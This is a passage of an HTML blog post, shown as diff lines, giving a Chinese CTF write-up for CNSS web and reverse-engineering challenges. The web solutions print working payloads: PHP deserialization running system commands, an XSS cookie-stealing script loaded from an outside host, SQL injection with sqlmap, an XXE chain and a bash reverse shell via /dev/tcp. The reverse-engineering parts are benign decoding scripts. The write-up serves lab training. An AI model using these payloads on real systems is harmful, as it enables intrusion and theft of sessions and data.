+if (isset($_GET['cnss'])) &#123;
+    $_SESSION['cnss'] = $_GET['cnss'];
+&#125;
+</code></pre>
+<p>稍加搜索就能知道是反序列化问题, 现在就是要构建这个反序列, 然后绕过wakeup函数. 教程比较长, 网上的都很详细, 善用搜索, 这里就不写了.</p>
+<p>说个不常见的问题, 我最先构建出来的是这样的</p>
+<p><code>O:4:&quot;CNSS&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;code&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;&#125;</code></p>
+<p>运行后没反应, 然后我<s>骚扰xlykle之后</s>发现这两个变量都是private, 网上的大多都是public, 所以寻找到private需要在前面加上<code>%00类名%00</code>来表示私有, 注意%00是一个字符(其实就是\0), 所以改成:</p>
+<p><code>O:4:&quot;CNSS&quot;:3:&#123;s:14:&quot;%00CNSS%00username&quot;;s:5:&quot;admin&quot;;s:10:&quot;%00CNSS%00code&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;&#125;</code></p>
+<p>所以先访问<code>http://8.130.29.197:6008/save.php?cnss=|O:4:%22CNSS%22:3:&#123;s:14:%22%00CNSS%00username%22;s:5:%22admin%22;s:10:%22%00CNSS%00code%22;s:20:%22system(%22cat%20/flag%22);%22;&#125;</code>, 再访问<code>http://8.130.29.197:6008/</code>得到结果</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12orfyv-2.png" alt="image"></p>
+<p><code>CNSS&#123;Admin_1s_w4tch1ng_y0u&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%98%B0to_be_admin_again_and_again-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">😰To_be_Admin_Again_and_Again | 难度评分: ★★★★</h2>
+<blockquote>
+<p>XSS攻击.</p>
+</blockquote>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oro9h-2.png" alt="image"></p>
+<p>与admin有关, 可以尝试<code>http://1.117.6.207:65005/admin</code>, 显示<code>Get out, HACKER! Only admin can see the flag!</code>, 说明需要一个admin的验证, 这里想到获取admin的cookie.</p>
+<p>每条留言会自动查看, 可以使用XSS攻击, 很容易看出来Name和Email两栏有XSS漏洞, 可以使用<code>&quot;&gt;</code>封闭<code>input</code>标签并插入一个script标签进行Cookie的获取. 这里我直接使用了一个<a target="_blank" rel="noopener" href="https://xssaq.com/">XSS平台</a>进行了payload构建, 可以自己搭服务器.</p>
+<p>payload: <code>&quot;&gt;&lt;sCRiPt sRC=//uj.ci/Qpae&gt;&lt;/sCrIpT&gt;</code></p>
+<p>使用preview可以发现payload已被正常解析成了html语句, 后台也收到了cookie:<br>
+<img src="http://pic.timlzh.com/i/2023/11/03/12orwng-2.png" alt="image"></p>
+<p><img src="uploading..." alt="image"></p>
+<p>然后只需要暴力碰撞一下这个sha256即可发送至后台获取Admin的cookie.</p>
+<p>碰撞代码的python源码:</p>
+<pre><code class="language-python">import hashlib
+ 
+def sha256(s):
+    return hashlib.sha256(s.encode('utf-8')).hexdigest()
+ 
+if __name__ == &quot;__main__&quot;:
+    def sha256Crack(token):
+        for i in range(10000000000):
+            # print(sha256(i))
+            a = sha256(f&quot;&#123;i:04d&#125;&quot;)[:6] 
+            print(f'\r&#123;a&#125;', end='', flush=True)
+            if a == token[:6]:
+                print()
+                return i
+        print()
+        return None
+
+    print(sha256Crack(str(input())))
+</code></pre>
+<p>拿到cookie就可以改cookie去<code>/admin</code>了, 直接打开就有flag辽</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12orxkr-2.png" alt="image"></p>
+<p><code>CNSS&#123;Admin_1s_AAAAAAAAAngry&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%8F%83-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B7%91%E8%B7%AF-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85(%E6%89%8B%E5%8A%A8)-%E2%98%85%E2%98%85%E2%98%85%E2%98%85(sqlmap)" tabindex="-1">🏃 第一次跑路 | 难度评分: ★★★★★(手动) ★★★★(sqlmap)</h2>
+<p>这道题结合题目描述是sqli, 数据库泄露一类的题, 这里写一下sqlmap一把梭的方法~~(其实是我不会手动)~~</p>
+<p>这里先用login接口用万能账户登录试试:</p>
+<p><code>admin'or+1=1#</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12os1gl-2.png" alt="image"></p>
+<p>可以进到welcome.php:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12os8nu-2.png" alt="image"></p>
+<p>那就用sql, 先从login接口出发, 命令如下:</p>
+<pre><code>sqlmap -u &quot;http://8.130.29.197:6011/login.php&quot;  --data=&quot;username=cnss&amp;password=1&quot; -D CN55 -T user -C &quot;id,username,password&quot; --dump
+</code></pre>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oshxd-2.png" alt="image"></p>
+<p>很好, fake flag, 结合网页里忘记密码按键会弹出cookie, 我们改成用cookie sqlmap, 记得改level 2才会扫描cookie的漏洞, 从login.php扫描不行, 会跳盲注:</p>
+<p><code>sqlmap -u &quot;http://8.130.29.197:6011/login.php&quot; --cookie &quot;username=cnss&quot; --level 2</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12osnev-2.png" alt="image"></p>
+<p>所以我们改用welcome.php为入口试试, 即可解出:</p>
+<pre><code>sqlmap -u &quot;http://8.130.29.197:6011/welcome.php&quot; --cookie &quot;username=cnss&quot; --level 2 --dbs --hex
+sqlmap -u &quot;http://8.130.29.197:6011/welcome.php&quot; --cookie &quot;username=cnss&quot; --level 2 -D CN55 --tables --hex
+sqlmap -u &quot;http://8.130.29.197:6011/welcome.php&quot; --cookie &quot;username=cnss&quot; --level 2 -D CN55 -T fulage --dump --hex
+</code></pre>
+<p>结果:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12osz33-2.png" alt="image"></p>
+<p><code>CNSS&#123;5QLI_w17h_Cooki3&#125;</code></p>
+<blockquote>
+<p>这道题本意是要ban了sqlmap的, 非常建议大家去学习一下手动sqli, <s>而不是看我sqlmap摆烂</s>. <a target="_blank" rel="noopener" href="https://4ever-xxxl.github.io/2022/08/28/CNSS%E5%A4%8F%E4%BB%A4%E8%90%A5_WEB_WP/#%F0%9F%8F%83-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B7%91%E8%B7%AF">点我看xxxl大佬的WP</a></p>
+</blockquote>
+<hr>
+<h2 id="%F0%9F%92%89-inject-me-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">💉 Inject me | 难度评分: ★★★★★★</h2>
+<blockquote>
+<p>Hurrison的高质量神题</p>
+</blockquote>
+<p><mark><strong>我认为这道题的质量非常高, 涉及的知识面很广, 需要耐下心一点一点尝试才能找到突破口. 以下我都是直接总结出来正确做法, 其实当时的思路偏差很大, 一点一点纠正回来的. 比如看到127.0.0.1的第一想法是改X-Forwarded-For为127.0.0.1、看到权限问题想到直接提权shell等, 这些错误的想法就不一一列出来了.</strong></mark></p>
+<p><strong>注意: 建议使用linux系统运行wp中的python脚本, windows由于网络区别可能会有bug</strong></p>
+<p>打开链接发现404, 下载jar后反编译发现是springboot架构, 阅读代码找到几个关键链接<code>/cnss/summer/login</code>, <code>/cnss/summer/parse</code>, <code>/cnss/doCmd</code></p>
+<h3 id="step-1.-%E7%BB%95%E8%BF%87login%E5%92%8Cparse%E7%9A%84filter" tabindex="-1">Step 1. 绕过<code>login</code>和<code>parse</code>的filter</h3>
+<p>/cnss/summer/login post请求 us3rname和pa@sswd, 返回token (md5), SESSION的有效时长仅有5秒</p>
+<p>/cnss/summer/parse 需要使用SUMMMMMER请求 Header中需要附上一个UUID, 这个UUID加密后的结果和token的前四位相等, 则认为是合法的请求, 通过filter, 这个UUID可以直接暴力破解出来.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12osyq5-2.png" alt="image"></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ot2tb-2.png" alt="image"></p>
+<p>实现代码:</p>
+<pre><code class="language-python">from requests import Session, Request
+import hashlib
+import itertools
+import json
+
+# 获取md5
+def md5(s):
+    m = hashlib.md5()
+    m.update(s.encode('utf-8'))
+    return m.hexdigest()
+
+# 生成一个由常见字符随机组合成的字典, 1-4位
+word = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()_+&#123;&#125;|:&quot;&lt;&gt;?[]\;\',./'
+dic = []
+for i in range(1, 4):
+    dic.extend([''.join(x) for x in itertools.product(word, repeat=i)])
+
+# 返回碰撞出的结果
+def md5Crack(token):
+    return next((i for i in dic if md5(i)[:4] == token[:4]), None)
+
+if __name__ == &quot;__main__&quot;:
+    # 创建一个Session
+    s = Session()
+
+    # 登录并获取token
+    loginUrl = 'http://1.117.6.207:45864/cnss/summer/login'
+    loginRes = s.post(loginUrl, json=&#123;'us3rname': 'us3rname', 'p@ssword': 'p@ssword'&#125;)
+    token = loginRes.json()['data']['token']
+    
+    # 碰撞伪造一个md5相同的uuid
+    forgeUUID = md5Crack(token)
+    print(forgeUUID)
+
+    xml = &quot;xml负载&quot;
+    
+    url = 'http://1.117.6.207:45864/cnss/summer/parse?nammmmme=us3rname'
+    data = &#123;
+        'username': 'us3rname',
+        'xml': xml,
+    &#125;
+    headers = &#123;
+        'UUID': forgeUUID,
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'
+    &#125;
+
+	# 初始化SUMMMMMER请求
+    summerRequest = Request('SUMMMMMER', url, data=json.dumps(data), headers=headers)
+    prep = s.prepare_request(summerRequest)
+
+    x = s.send(prep)
+    print(x.text)
+    print(x.json()['data'])
+
+</code></pre>
+<h3 id="step-2.-%E7%BB%95%E8%BF%87docmd%E7%9A%84filter" tabindex="-1">Step 2. 绕过<code>doCmd</code>的filter</h3>
+<p>/cnss/cmd?cmd= 可以执行命令, 但是需要从127.0.0.1发起请求, 根据题目hint<code>XXE注入</code>可以想到通过<code>/cnss/summer/parse</code>对xml的编码进行xxe注入, 从本地发起请求.</p>
+<p><strong>这里要注意xml中的url要使用url编码</strong></p>
+<p>修改上文代码如下</p>
+<pre><code class="language-python">from urllib.parse import quote
+
+...
+
+	# XXE注入, 这里对command进行了url编码避免出错
+	command = '命令'  
+	xml = f'''&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+	&lt;!DOCTYPE test[
+		&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:5000/cnss/doCmd?cmd=&#123;quote(command)&#125;&quot;&gt;
+	]&gt;
+	&lt;root&gt;&amp;xxe;&lt;/root&gt;
+	'''
+
+...
+
+</code></pre>
+<h3 id="step-3.-%E5%8F%8D%E5%BC%B9shell" tabindex="-1">Step 3. 反弹shell</h3>
+<p>根据hint可以想到用doCmd反弹一个shell, 这里可能需要你有一个具有公网ip的服务器.</p>
+<p>先贴上代码, command改为如下:</p>
+<pre><code class="language-python">command = 'bash -i &gt;&amp; /dev/tcp/你服务器公网ip/你nc监听的端口 0&gt;&amp;1'  # 反弹shell
+</code></pre>
+<p>使用你的服务器打开nc监听, 具体命令为<code>nc -l -vv -p [端口]</code>, 比如我使用<code>nc -l -vv -p 6809</code>, 效果如下, 说明已经开始监听:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ot4bf-2.png" alt="image"></p>
+<p>此时运行上面的代码, 可以发现shell已经被弹到我们的命令行中了, 此时可以随意输入指令了</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12otblz-2.png" alt="image"></p>
+<h3 id="step-4.-%E4%BD%BF%E7%94%A8curl%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83%2C-%E8%AE%BF%E9%97%AEflag" tabindex="-1">Step 4. 使用curl命令提权, 访问flag</h3>
+<p>在shell中返回到根目录, ls发现有<code>fl444444g</code>, 直接输出发现权限不足, 需要提权.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12otj6j-2.png" alt="image"></p>
+<p>此处当时我寻找的教程是知乎文章: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/341658060">Linux提权的几种常用方式</a>, 也推荐仔细阅读一下hurrison大佬hint中的教程, 更加详细.</p>
+<p>使用命令<code>find / -perm -u=s -type f 2&gt;/dev/null</code>找到有root权限的命令:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12otltz-2.png" alt="image"></p>
+<p>发现<code>curl</code>在其中, 可以使用<code>file://</code>协议 + <code>curl</code>读取文件:</p>
+<p>命令: <code>curl file:///fl444444g</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12otrjf-2.png" alt="image"></p>
+<p>找到flag.</p>
+<p><code>CNSS&#123;5dc5330bbeac0192a8db6bf9b269470781e74aff192623e0419edfa0c5e2f8ad&#125;</code></p>
+<h1 id="reverse" tabindex="-1">Reverse</h1>
+<h2 id="%F0%9F%92%A1-hello-reverse-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">💡 Hello Reverse | 难度评分: ★</h2>
+<p>下载IDA, 打开工程, flag就在眼前.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12otrt7-2.png" alt="image"></p>
+<p><code>cnss&#123;This_is_the_format_of_flag&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%90%B8-find-the-key-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">🐸 Find the key | 难度评分: ★</h2>
+<p>可以扔进linux运行, 可以不运行. 我直接用IDA打开, 找到main函数, 跟着hint一步一步来.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oua8u-2.png" alt="image"></p>
+<p><code>Hint:push F5 in the IDA.</code>按下F5反编译, 可以看到伪C代码.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouj5x-2.png" alt="image"></p>
+<p>看函数有个叫click_me的, 直接点开</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouh7o-2.png" alt="image"></p>
+<p><code>You can see the key1 in assemble window</code>去assemble window可以看到转char后的变量值</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12oujy7-2.png" alt="image"></p>
+<p>找到第一部分flag<code>IDA-is</code></p>
+<p>继续走到next, 提示进I_am_hear</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouuxn-2.png" alt="image"></p>
+<p>进去后看到第二部分flag<code>a-useful-tool</code>, 并提示搜索key, 搜索到结果<code>of-reverse</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouxo8-2.png" alt="image"></p>
+<p>所以flag就是<code>cnss&#123;IDA-is-a-useful-tool-of-reverse&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%92%AF-baby-c-code-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85" tabindex="-1">💯 Baby C code | 难度评分: ★</h2>
+<p>扔IDA直接F5, 得到核心伪代码:</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+&#123;
+  char a[6]; // [rsp+2Ah] [rbp-16h] BYREF
+  int i_1; // [rsp+30h] [rbp-10h]
+  int i_0; // [rsp+34h] [rbp-Ch]
+  char b; // [rsp+3Bh] [rbp-5h]
+  int i; // [rsp+3Ch] [rbp-4h]
+
+  _main(argc, argv, envp);
+  strcpy(a, &quot;cnss&#123;&quot;);
+  for ( i = 0; i &lt;= 4; ++i )
+    flag[i] = a[i];
+  b = 65;
+  for ( i_0 = 5; i_0 &lt;= 17; ++i_0 )
+  &#123;
+    flag[i_0] = b;
+    b += 2;
+  &#125;
+  flag[18] = 125;
+  puts(&quot;Plz input the flag:&quot;);
+  scanf(&quot;%19s&quot;, input);
+  if ( strlen(input) == 19 )
+  &#123;
+    for ( i_1 = 0; i_1 &lt;= 18; ++i_1 )
+    &#123;
+      if ( flag[i_1] != input[i_1] )
+        goto LABEL_8;
+    &#125;
+    puts(&quot;Congratulation&quot;);
+    system(&quot;pause&quot;);
+    return 0;
+  &#125;
+  else
+  &#123;
+LABEL_8:
+    puts(&quot;Wrong&quot;);
+    system(&quot;pause&quot;);
+    return 0;
+  &#125;
+&#125;
+</code></pre>
+<p>关键部分是</p>
+<pre><code class="language-cpp">strcpy(a, &quot;cnss&#123;&quot;);
+for ( i = 0; i &lt;= 4; ++i )
+	flag[i] = a[i];
+b = 65;
+for ( i_0 = 5; i_0 &lt;= 17; ++i_0 )
+&#123;
+	flag[i_0] = b;
+	b += 2;
+&#125;
+flag[18] = 125;
+</code></pre>
+<p>65是<code>A</code>的ascii码, 然后每隔两个取一个, 取13个, 就是<code>ACEGIKMOQSUWY</code></p>
+<p>所以flag就是<code>CNSS&#123;ACEGIKMOQSUWY&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%8E%AB-baby-xor-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85" tabindex="-1">🎫 Baby XOR | 难度评分: ★★</h2>
+<p>IDA打开发现加密, 直接F5</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouv33-2.png" alt="image"></p>
+<p>核心问题是v4经过了怎样的加密, 进入sub_4016EC函数.</p>
+<pre><code class="language-c">int __cdecl sub_4016EC(int a1)
+&#123;
+  int result; // eax
+  int i; // [esp+1Ch] [ebp-Ch]
+
+  for ( i = 0; i &lt;= 32; i += 3 )
+    result = sub_401698(2 * i + a1);
+  return result;
+&#125;
+</code></pre>
+<p>发现这里IDA解析出来的参数是int, 我们明显传进去的是字符串数组, 所以我们直接修正成<code>_WORD*</code>类型</p>
+<pre><code class="language-c">_WORD *__cdecl sub_4016EC(_WORD *a1)
+&#123;
+  _WORD *result; // eax
+  int i; // [esp+1Ch] [ebp-Ch]
+
+  for ( i = 0; i &lt;= 32; i += 3 )
+    result = sub_401698(&amp;a1[i]);
+  return result;
+&#125;
+</code></pre>
+<p>结合<code>sub_401698</code></p>
+<pre><code class="language-c">_WORD *__cdecl sub_401698(_WORD *a1)
+&#123;
+  _WORD *result; // eax
+
+  *a1 ^= a1[1];
+  a1[2] ^= a1[1];
+  result = a1 + 1;
+  a1[1] ^= *a1;
+  return result;
+&#125;
+</code></pre>
+<p>可以看出来这里给数组三个一组进行异或处理, 简化成python代码就是</p>
+<pre><code class="language-python">def encode(a):
+	for i in range(0, 33, 3):
+		a[i] ^= a[i + 1]
+		a[i + 2] ^= a[i + 1]
+		a[i + 1] ^= a[i]
+</code></pre>
+<p>异或运算是可逆的, 我们直接反着来一遍即可:</p>
+<pre><code class="language-python">def decode(a):
+	for i in range(0, 33, 3):
+		a[i + 1] ^= a[i]
+		a[i + 2] ^= a[i + 1]
+		a[i] ^= a[i + 1]
+</code></pre>
+<p>然后我们找到word_403020的值, 直接右键改成Array, 大小看<code>_main</code>中是34</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ov387-2.png" alt="image"></p>
+<p>直接export出去, 改成Python的格式:</p>
+<pre><code class="language-python">word_403020 = [
+  13,
+  99,
+  29,
+  8,
+  115,
+  46,
+  59,
+  95,
+  11,
+  30,
+  95,
+  30,
+  40,
+  71,
+  0,
+  59,
+  100,
+  21,
+  13,
+  111,
+  61,
+  39,
+  73,
+  49,
+  1,
+  100,
+  6,
+  11,
+  111,
+  1,
+  0,
+  33,
+  92,
+  0,
+]
+</code></pre>
+<p>结合我们的解密代码, 可以写出python解密程序</p>
+<pre><code class="language-python">word_403020 = [
+    13,
+    99,
+    29,
+    8,
+    115,
+    46,
+    59,
+    95,
+    11,
+    30,
+    95,
+    30,
+    40,
+    71,
+    0,
+    59,
+    100,
+    21,
+    13,
+    111,
+    61,
+    39,
+    73,
+    49,
+    1,
+    100,
+    6,
+    11,
+    111,
+    1,
+    0,
+    33,
+    92,
+    0,
+]
+
+
+def decode(a):
+    for i in range(0, 33, 3):
+        a[i + 1] ^= a[i]
+        a[i + 2] ^= a[i + 1]
+        a[i] ^= a[i + 1]
+
+decode(word_403020)
+
+print(&quot;&quot;.join([chr(c) for c in word_403020]))
+</code></pre>
+<p>运行结果:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ouzio-2.png" alt="image"></p>
+<p><code>cnss&#123;U_do_A_Good_Job_In_decode!!&#125; </code></p>
+<hr>
+<h2 id="%F0%9F%98%86-encoder-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">😆 Encoder | 难度评分: ★★★</h2>
+<p>IDA打开</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ovcbq-2.png" alt="image"></p>
+<p>可以找到一个字符串aAbcdefghijklmn是<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>, 这是base64加密的索引表.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ovib4-2.png" alt="image"></p>
+<p>读main函数中找到的sub_4016B6函数可以发现索引表被进行了更改.</p>
+<p>所以这里自定义了索引表进行base64加密, 加密后的结果是<code>jLG/5Q7iZ0NI9ituYKtwZLN0Z8UNxwiIWLit</code>.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ovgsa-2.png" alt="image"></p>
+<p>我们直接在更改索引表的函数之后的某一行上打上断点开始动态调试, 注意要输入<code>长度为27且格式为cnss&#123;xxxx&#125;</code>才能执行到那里</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ovpt0-2.png" alt="image"></p>
+<p>然后我们找到aAbcdefghijklmn, 就获取到了base64的索引表<code>qAFHSNKTBUglYrbVc9MXWiaZjm345xkROp6Ewhouz2JDv7dfyCI/08LQPG+nste1</code></p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ovrij-2.png" alt="image"></p>
+<p>直接使用Python写个脚本解密就行</p>
+<pre><code class="language-python">import base64
+
+originString = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' # 原索引表
+changedString = 'qAFHSNKTBUglYrbVc9MXWiaZjm345xkROp6Ewhouz2JDv7dfyCI/08LQPG+nste1' # 替换后的索引表
+encodedString = 'jLG/5Q7iZ0NI9ituYKtwZLN0Z8UNxwiIWLit' # 加密后的字符串
+
+print(base64.b64decode(encodedString.translate(str.maketrans(changedString, originString))))
+</code></pre>
+<p>运行结果:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ow05h-2.png" alt="image"></p>
+<p><code>cnss&#123;U_ArE_g0od_at_REvErSe&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%A4%96-baby-android-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85" tabindex="-1">🤖 Baby Android | 难度评分: ★★</h2>
+<p>JADX打开, 发现使用了RC4加密, 密文是<code>f18cda5ef7c83f104401c5385063e0e070b96400786da665b5</code>, 秘钥是<code>Sh1no</code>.</p>
+<p>找个RC4加密的脚本(RC4加解密通用, 解密就是再加密一次)</p>
+<pre><code class="language-python">import binascii
+ 
+def rc4_crypt(PlainBytes:bytes, KeyBytes:bytes) -&gt; str:
+    '''[summary]
+    rc4 crypt
+    Arguments:
+        PlainBytes &#123;[bytes]&#125; -- [plain bytes]
+        KeyBytes &#123;[bytes]&#125; -- [key bytes]
+    
+    Returns:
+        [string] -- [hex string]
+    '''
+ 
+    keystreamList = []
+    cipherList = []
+ 
+    keyLen = len(KeyBytes)
+    plainLen = len(PlainBytes)
+    S = list(range(256))
+ 
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + KeyBytes[i % keyLen]) % 256
+        S[i], S[j] = S[j], S[i]
+ 
+    i = 0
+    j = 0
+    for m in range(plainLen):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        k = S[(S[i] + S[j]) % 256]
+        cipherList.append(k ^ PlainBytes[m])
+ 
+    result_hexstr = ''.join(['%02x' % i for i in cipherList])
+    return result_hexstr.upper()
+
+if __name__ == &quot;__main__&quot;:
+    hexString='f18cda5ef7c83f104401c5385063e0e070b96400786da665b5'
+    key = 'Sh1no'.encode('utf-8').hex()
+    print(&quot;rc4 result:&quot;, binascii.a2b_hex(rc4_crypt(binascii.a2b_hex(hexString), binascii.a2b_hex(key))).decode())
+</code></pre>
+<p>结果:</p>
+<p><code>cnss&#123;4ndro1d_1s_5o_e1sy!&#125;</code></p>
+<hr>
+<h2 id="%F0%9F%90%8D-easypy-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">🐍 EasyPy | 难度评分: ★★★★</h2>
+<hr>
+<h2 id="%F0%9F%8D%89loopers-%7C-%E9%9A%BE%E5%BA%A6%E8%AF%84%E5%88%86%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%85" tabindex="-1">🍉LOOPERS | 难度评分: ★★★★★★</h2>
+<p>网页打开可以在审查中找到wasm文件, 可以看出这道题是webAssembly的逆向.</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ow0ld-2.png" alt="image"></p>
+<p>先用wasm2c将wasm转成.c文件, 再编译成二进制文件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt">wasmTools链接</a></p>
+<pre><code>./wasm2c flag.wasm -o flag.c
+gcc -c flag.c -o flag.o
+</code></pre>
+<p>JEB应该是可以直接打开得到正常代码的, 而我选择了最笨的方法: 用ida打开, 并将伪代码翻译成python:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ow2xi-2.png" alt="image"></p>
+<p>注意, 代码里的i32_load是加载int, 而i32_load8_u是加载的char, 需要&amp;0xff</p>
+<p>这是我翻译后的python程序:</p>
+<pre><code class="language-python">def do_sth(arr, a, b, c, d):
+    arr[d] ^= (arr[a] + arr[c])
+    arr[d] &amp;= 0xFF
+    
+    arr[c] ^= (arr[a] + arr[b])
+    arr[c] &amp;= 0xFF
+    
+    arr[b] ^= (arr[c] + arr[d]) 
+    arr[b] &amp;= 0xFF
+    
+    arr[a] ^= (arr[b] + arr[d])
+    arr[a] &amp;= 0xFF
+
+
+def check(flag, key, enc):
+    dic = '0123456789abcdef'
+
+    if len(key) &lt; 8:
+        return False        
+
+    i = False
+    j = 0
+
+    while j &lt; len(flag):
+        # init Seed
+        seed = [0, 0, 0, 0, 0, 0, 0, 0]
+        for k in range(8):    
+            seed[k] = ord(key[k]) ^ ord(flag[k + j]) &amp; 0xFF
+        for _ in range(114):
+            do_sth(seed, 0, 1, 2, 3)
+            do_sth(seed, 4, 5, 6, 7)
+            do_sth(seed, 0, 1, 4, 5)
+            do_sth(seed, 2, 3, 6, 7)
+        for m in range(8):
+            v25 = enc[2*(m + j)]
+            v23 = dic[seed[m] // 16]
+            i |= (v25 != v23)
+
+            v18 = enc[2*(m + j) + 1]
+            i |= v18 != dic[seed[m] % 16]
+
+        j += 8
+        result = i
+    return result
+
+key = &quot;114!514!&quot;
+enc = &quot;d0cbc764d6a45cb05eeeb47940d25543b876b5b94314031aa8eb756081cc8718&quot;
+
+flag = input()
+print(check(flag, key, enc))
+</code></pre>
+<p>dic这个字母表是我动调从浏览器里拿到的, 当时还没看出来, 后面才发现是小端在前16进制的一个字母表.</p>
+<p>读懂加密程序后直接反着来就行了:</p>
+<pre><code class="language-python">def re_do_sth(arr, a, b, c, d):
+    arr[a] ^= (arr[b] + arr[d])
+    arr[a] &amp;= 0xFF
+    
+    arr[b] ^= (arr[c] + arr[d]) 
+    arr[b] &amp;= 0xFF
+    
+    arr[c] ^= (arr[a] + arr[b])
+    arr[c] &amp;= 0xFF
+    
+    arr[d] ^= (arr[a] + arr[c])
+    arr[d] &amp;= 0xFF
+
+key = &quot;114!514!&quot;
+enc = &quot;d0cbc764d6a45cb05eeeb47940d25543b876b5b94314031aa8eb756081cc8718&quot;
+dic = '0123456789abcdef'
+seeds = []
+for j in range(4):
+    seed = []
+    for i in range(j*16, (j+1)*16 - 1, 2):
+        seed.append(dic.index(enc[i]) * 16 + dic.index(enc[i+1]))
+    seeds.append(seed)
+
+flag = ''
+ss = []
+for s in seeds:
+    seed = s
+    n = 0
+    while n &lt; 114:
+        re_do_sth(seed, 2, 3, 6, 7)
+        re_do_sth(seed, 0, 1, 4, 5)
+        re_do_sth(seed, 4, 5, 6, 7)
+        re_do_sth(seed, 0, 1, 2, 3)
+        n += 1
+    
+    # print(s)
+
+    flag = ''
+    k = 0
+    while k &lt; 8:    
+        flag += chr(ord(key[k]) ^ s[k] &amp; 0xFF)
+        k += 1
+    print(flag, end='')
+</code></pre>
+<p>运行获得flag:</p>
+<p><img src="http://pic.timlzh.com/i/2023/11/03/12ow9qh-2.png" alt="image"></p>
+<p>这肯定不是最好的方法, 但是当时我不会用jeb, 所以用了这种笨方法, 但是逆向程序是正确的.</p>
+<p><code>cnss&#123;Y0u_Kn0w_W4SM_n0w!!W0oo0ow&#125;</code></p>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+
+                            <!-- Meta -->
+                            <div class="post-meta">
+                                <hr>
+                                <br>
